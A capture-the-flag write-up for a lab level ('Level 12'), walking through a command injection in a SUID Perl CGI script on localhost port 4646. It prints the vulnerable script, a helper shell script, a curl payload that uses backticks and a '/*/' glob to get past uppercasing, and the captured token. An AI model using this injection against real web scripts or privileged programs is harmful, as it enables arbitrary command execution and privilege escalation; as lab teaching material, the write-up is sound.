# Level 12 - Command Injection Exploit

This level demonstrates a **command injection** vulnerability in a Perl script.

---

## Step 1: Inspect the Directory

```bash
ls -la
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
```

level12.pl is SUID and runs with flag12's privileges.

Step 2: Examine the Perl Script

```bash
cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  \$nn = \$_[1];
  \$xx = \$_[0];
  \$xx =~ tr/a-z/A-Z/;
  \$xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach \$line (@output) {
      (\$f, \$s) = split(/:/, \$line);
      if(\$s =~ \$nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if(\$_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

The program uses port 4646 and waits for two arguments. It capitalizes the first argument, removes characters after a whitespace, and searches for a match, returning the errors to stdout.
Step 3: Exploit the Command Injection

```bash
ls -l SCRIPT12
-rw-rw-r-- 1 level12 level12 32 May 15 19:03 SCRIPT12

cat SCRIPT12
#!/bin/sh
getflag > /tmp/flag12
chmod 777 /tmp/SCRIPT12
```

Execute the command injection:

```bash
curl localhost:4646?x='`/*/SCRIPT12`'
```

..

Step 4: Retrieve the Token

```bash
cat /tmp/flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

✅ Summary

    Command Injection: The use of backticks allowed us to inject a command to retrieve the flag.
    The level12.pl script failed to securely handle user input.
    This exposed a restricted file by executing arbitrary commands.
